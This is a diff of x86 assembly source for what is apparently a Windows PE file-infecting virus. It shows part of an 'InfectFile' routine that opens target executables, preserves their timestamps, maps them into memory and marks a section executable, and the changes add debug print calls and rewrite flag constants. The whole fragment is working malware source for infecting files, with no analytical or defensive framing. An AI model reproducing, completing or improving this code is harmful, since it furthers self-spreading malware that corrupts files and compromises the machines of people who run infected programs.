@@ -303,6 +303,7 @@ InfectFile:
     call    [ebp + DATA.GetFileAttributesA]         ; Get the file attributes
     cmp     eax, 0
     mov     [ebp + DATA.fileAttributes], eax
+    PRINTH  "fileAttributes", eax
 
     ;; set the nomral attributes to the file
 
@@ -318,9 +319,7 @@ InfectFile:
     push    3                                       ; Open existing file
     push    0                                       ; Security option = default
     push    1                                       ; File share for read
-    mov     ebx, WRITABLE
-    or      ebx, READABLE
-    push    ebx                                     ; General write and read
+    push    GENERIC_READ | GENERIC_WRITE            ; General write and read
     lea     ebx, [ebp + DATA.findData + FIND_DATA.cFileName]
     push    ebx                                     ; Address to filename
     call    [ebp + DATA.CreateFileA]                ; create the file
@@ -329,6 +328,7 @@ InfectFile:
     mov     [ebp + DATA.fileHandle], eax            ; Save file handle
     cmp     eax, -1                                 ; error ?
     je      InfectionError                          ; cant open the file ?
+    PRINTH  "fileHandle", eax
 
     ;; save File creation time, Last write time, Last access time
 
@@ -354,6 +354,7 @@ InfectFile:
     push    ebx
     call    [ebp + DATA.CreateFileMappingA]         ; map file to memory
                                                     ; EAX = new map handle
+    PRINTD  "CreateFileMapping handle", eax
 
     mov     [ebp + DATA.mapHandle], eax             ; Save map handle
     cmp     eax, 0                                  ; Error ?
@@ -455,7 +456,7 @@ OkGo:
 
     pop   ebx                                       ; restore old PE header into ebx
 
-    or      dword [esi + SECTIONH.Characteristics], CODE | EXECUTABLE   ; Set [CWE] flags (CODE)
+    or      dword [esi + SECTIONH.Characteristics], CODE | GENERIC_EXECUTE   ; Set [CWE] flags (CODE)
 
     ;; The flags tell the loader that the section now
     ;; has executable code and is writable
